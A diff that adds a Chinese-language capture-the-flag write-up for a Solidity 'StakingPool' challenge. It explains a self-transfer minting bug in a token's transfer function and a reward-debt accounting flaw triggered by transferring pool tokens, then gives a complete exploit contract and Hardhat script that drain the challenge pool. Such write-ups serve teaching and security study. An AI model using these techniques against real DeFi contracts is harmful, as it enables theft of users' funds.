@@ -419,4 +419,191 @@ function pos() public view returns (bytes32) {
 
 ## StakingPool
 
-TODO
+题目质押池有 2 个 奖励代币，一个是 ERC20,另一个是 ERC20V2,然后质押区块限制了只有 60 个，并且每个块奖励有 1e5 eth，即最多能够拿到的奖励是 6e6 eth。
+
+然后在初始化这里给池子里放了各 1e8 eth 的奖励代币，flag 的获取条件是 ERC20 我们得拿到 1e8 eth，ERC20V2 我们得拿到大于 16 * 1e8 eth 的钱。这个 ERC20V2 的条件比较奇怪，因为条件已经超出了池子中的钱，所以可以考虑其本身的合约出现了问题，通过对它 fc 可以看到在 transfer 函数中：
+
+```solidity
+uint256 fromBalance = _balances[from];
+require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
+uint256 toBalance = _balances[to];
+unchecked {
+    _balances[from] = fromBalance - amount;
+    // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
+    // decrementing then incrementing.
+    _balances[to] = toBalance + amount;
+}
+```
+
+from 和 to 为同一个时可以虚空刷钱。
+
+所以现在只需要解决 ERC20 == 1e8 eth 了，但是前面分析过在初始化的时候，最多应该只能拿到 6e6 eth 的奖励，所以得考虑奖励的计算是否出现了问题。
+
+首先看 `desposit` 函数流程：
+
+- 确认当前区块在允许的质押区块范围内
+- 更新池子并计算当前区块的奖励
+- 如果当前用户有存款
+  - 计算**这一部分**用户的奖励并输出转移到奖励代币，这一部分指的是用当前的计算结果减去之前记录下的奖励 (rewardDebt)
+- 如果当前用户正进行存款 (接受并转移 stakedToken)
+  - 记录存款 (发放等量 poolToken)
+  - 更新用户的暂存奖励 (rewardDebt)
+
+对应的 `withdraw`：
+
+- 判断 user.amount 是否大于等于 amount
+- 更新池子并计算当前区块的奖励
+- 计算**这一部分**用户的奖励并输出转移到奖励代币，这一部分指的是用当前的计算结果减去之前记录下的奖励 (rewardDebt)
+- 如果需要取钱
+  - 返回 amount 数量的 stakedToken 和 poolToken
+- 计算用户的暂存奖励 (rewardDebt)
+
+`accTokenPerShare` 会在 `_updatePool` 中更新：
+
+- 使用区块乘数（`multiplier`）和每块奖励（`rewardPerBlock`），计算从上次奖励区块到当前区块的总奖励。
+- 将新计算的奖励加到累积奖励上（`accTokenPerShare`）
+
+user.rewardDebt 则存储的上一次计算的奖励。每次领取真正的奖励时，使用这个式子：
+
+```solidity
+pending = user.amount * (accTokenPerShare) /  (PRECISION_FACTOR) - (user.rewardDebt)
+```
+
+在每次进行存款或者取款时候，都会进行一次奖励的更新以及分发，所以对于每次分发而言计算中保持变化的似乎只有 accTokenPerShare，但是如果在下一次计算之前改变了 user.amount，那么 `user.amount * (accTokenPerShare) /  (PRECISION_FACTOR)` 这个式子的结果显然远大于实际的奖励。
+
+user.amount 也可以通过 transfer 的方式来改变，这种情况下并不会触发计算 `user.rewardDebt`。
+
+所以这道题攻击思路就是：
+
+- HackerA 调用 `deposit` 方法在质押池中存入少量 eth 
+- HackerB 通过 `transfer` 方法给 HackerA 转钱，此时 HackerA 的 `user.amount` 会增加，但是 `user.rewardDebt` 不会改变
+- HackerA 使用 `withdraw` 取出所有的 eth
+- HackerA 对 ERC20V2 虚空刷钱
+
+??? info "EXP"
+    ```solidity
+    // SPDX-License-Identifier: UNLICENSED
+    pragma solidity ^0.8.0;
+
+    import "./StakingPoolsDeployment.sol";
+    import "./StakingPools_MT.sol";
+    import "./ERC20.sol";
+    import "./ERC20V2.sol";
+
+    import "hardhat/console.sol";
+
+    contract HackSub {
+
+        ERC20 public rewardToken1;
+        ERC20 public rewardToken2;
+        ERC20 public stakedToken;
+
+        StakingPools public stakingPools;
+        Hack public hack;
+
+        constructor(Hack _hack, StakingPools _stakingPools, ERC20 _rewardToken1, ERC20 _rewardToken2, ERC20 _stakedToken) {
+            hack = _hack;
+            rewardToken1 = _rewardToken1;
+            rewardToken2 = _rewardToken2;
+            stakedToken = _stakedToken;
+            stakingPools = _stakingPools;
+        }
+
+        function deposit(uint256 amount) public {
+            stakedToken.approve(address(stakingPools), amount);
+            stakingPools.deposit(amount);
+        }
+
+        function withdraw(uint256 amount) public {
+            stakingPools.withdraw(amount);
+        }
+
+        function collect() public {
+            rewardToken1.transfer(address(hack), rewardToken1.balanceOf(address(this)));
+            rewardToken2.transfer(address(hack), rewardToken2.balanceOf(address(this)));
+        }
+
+    }
+
+    contract Hack {
+
+        HackSub public hackSub;
+
+        ERC20 public rewardToken1;
+        ERC20 public rewardToken2;
+        ERC20 public stakedToken;
+
+        StakingPools public stakingPools;
+        StakingPoolsDeployment public stakingPoolsDeployment;
+
+        constructor() {
+            stakingPoolsDeployment = new StakingPoolsDeployment();
+
+            stakingPools = stakingPoolsDeployment.stakingPools();
+            rewardToken1 = stakingPoolsDeployment.rewardToken();
+            rewardToken2 = stakingPoolsDeployment.rewardToken2();
+            stakedToken = stakingPoolsDeployment.stakedToken();
+
+            hackSub = new HackSub(this, stakingPools, rewardToken1, rewardToken2, stakedToken);
+
+            stakingPoolsDeployment.faucet();
+        }
+
+        function runStep1() public {
+            stakedToken.transfer(address(hackSub), 1e18);
+            hackSub.deposit(1e18);
+        }
+
+        function runStep2() public {
+            stakedToken.approve(address(stakingPools), 99999e18);
+            stakingPools.deposit(99999e18);
+            stakingPools.transfer(address(hackSub), 99999e18);
+        }
+
+        function runStep3() public {
+            hackSub.withdraw(100000e18);
+            hackSub.collect();
+            for (uint256 i = 0; i < 5; i++) {
+                rewardToken2.transfer(address(this), rewardToken2.balanceOf(address(this)));
+            }
+        }
+
+        function passBlock() public {}
+    }
+    ```
+
+??? info "script"
+    ```js
+    const {ethers} = require("hardhat");
+
+    async function passBlock(hack, number) {
+        for (let i = 0; i < number; i++) {
+            const _ = await hack.passBlock();
+        }
+    }
+
+    async function main() {
+
+        const hackContract = await ethers.getContractFactory("Hack");
+        const hack = await hackContract.deploy();
+
+        const hackAddr = await hack.getAddress();
+        const challengeAddr = await hack.stakingPoolsDeployment();
+        const chall = await ethers.getContractAt("StakingPoolsDeployment", challengeAddr);
+
+        console.log("Hack deployed to:", hackAddr);
+
+        const tx1 = await hack.runStep1();
+        const tx2 = await hack.runStep2();
+        await passBlock(hack, 1);
+        const tx3 = await hack.runStep3();
+
+        // const rewardToken2Addr = await hack.rewardToken2();
+        // const rewardToken2 = await ethers.getContractAt("ERC20", rewardToken2Addr);
+        // const rewardToken2Balance = await rewardToken2.balanceOf(hackAddr);
+        // console.log("rewardToken2Balance:", rewardToken2Balance.toString());
+
+        const isSolved = await chall.isSolved();
+        console.log("isSolved:", isSolved);
+    }
+    ```
